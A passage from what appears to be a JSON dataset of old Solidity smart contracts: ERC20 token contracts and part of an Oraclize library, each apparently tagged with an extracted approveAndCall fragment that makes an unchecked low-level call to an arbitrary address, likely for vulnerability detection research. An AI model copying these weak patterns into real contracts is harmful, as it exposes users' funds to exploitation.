_decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb159b"
  },
  "filename": "35115.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 500000;\n totalSupply = 500000;\n name = \"byte\";\n decimals = 8;\n symbol = \"byte\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb159c"
  },
  "filename": "35124.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000000;\n totalSupply = 1000000000000000;\n name = \"EtherLite\";\n decimals = 10;\n symbol = \"ETL\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb159d"
  },
  "filename": "35144.sol",
  "content": "pragma solidity ^0.4.0;\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) payable returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n function setConfig(bytes32 _config);\n function setCustomGasPrice(uint _gasPrice);\n function randomDS_getSessionPubKeyHash() returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Android = 0x20;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0))\n oraclize_setNetwork(networkID_auto);\n if(address(oraclize) != OAR.getAddress())\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n }\n function oraclize_useCoupon(string code) oraclizeAPI internal {\n oraclize.useCoupon(code);\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_setConfig(bytes32 config) oraclizeAPI internal {\n return oraclize.setConfig(config);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if 